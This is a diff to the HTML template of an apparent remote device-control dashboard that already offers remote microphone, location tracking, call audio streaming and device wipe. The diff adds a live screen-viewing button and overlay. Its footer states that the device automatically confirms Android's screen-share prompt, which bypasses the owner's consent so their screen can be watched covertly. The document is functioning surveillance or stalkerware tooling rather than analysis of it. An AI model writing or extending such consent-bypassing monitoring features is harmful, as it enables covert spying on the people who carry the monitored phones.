@@ -1461,6 +1461,10 @@
                             <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><rect x="9" y="2" width="6" height="12" rx="3" stroke="currentColor" stroke-width="2"/><path d="M5 10a7 7 0 0014 0" stroke="currentColor" stroke-width="2"/><line x1="12" y1="17" x2="12" y2="22" stroke="currentColor" stroke-width="2"/></svg>
                             <span>🎙️ Mic</span>
                         </button>
+                        <button class="btn-remote" onclick="showLiveScreen()" title="Live Screen View (1 fps stream)">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><rect x="2" y="4" width="20" height="13" rx="2" stroke="currentColor" stroke-width="2"/><line x1="8" y1="21" x2="16" y2="21" stroke="currentColor" stroke-width="2"/><line x1="12" y1="17" x2="12" y2="21" stroke="currentColor" stroke-width="2"/></svg>
+                            <span>🖥️ Screen</span>
+                        </button>
                         <button class="btn-remote" onclick="sendCommand('wipe')" title="Wipe Device">
                             <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M3 6h18M8 6V4a1 1 0 011-1h6a1 1 0 011 1v2M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
                             <span>Wipe</span>
@@ -1603,9 +1607,25 @@
         const DEVICE_ID = "{{ device_id }}";
     </script>
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <!-- Live Screen Viewer overlay (see showLiveScreen() in device-detail.js) -->
+    <div id="liveScreenOverlay" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.88); z-index:10000; align-items:center; justify-content:center; flex-direction:column; gap:14px;">
+        <div style="display:flex; align-items:center; gap:10px;">
+            <span id="liveScreenDot" style="width:10px; height:10px; border-radius:50%; background:#666; display:inline-block;"></span>
+            <span id="liveScreenStatus" style="color:#e0e0e0; font-size:14px;">Starting…</span>
+        </div>
+        <img id="liveScreenFrame" style="max-width:92vw; max-height:78vh; border-radius:12px; border:1px solid rgba(255,255,255,0.2); background:#000; display:none;" alt="Live device screen">
+        <div style="display:flex; gap:10px;">
+            <button class="btn-sm" onclick="stopLiveScreen(true)" style="background:#ef4444; color:white;">⏹ Stop &amp; Close</button>
+            <button class="btn-sm" onclick="closeLiveScreen()" style="background:rgba(255,255,255,0.1); color:white;">✕ Close Viewer</button>
+        </div>
+        <div style="color:rgba(255,255,255,0.35); font-size:11px; max-width:520px; text-align:center;">
+            The device auto-confirms Android's screen-share prompt and streams ~1 frame/sec.
+            Stream auto-ends after 10 minutes.
+        </div>
+    </div>
     <script src="https://unpkg.com/leaflet-mouseposition@1.2.0/dist/L.Control.MousePosition.js"></script>
     <script src="/static/js/net-resilience.js?v=1"></script>
-    <script src="/static/js/device-detail.js?v=11"></script>
+    <script src="/static/js/device-detail.js?v=12"></script>
     <script>
         // ─── Call State + Audio Streaming ────────────────────────────
         let callStateInterval = null;
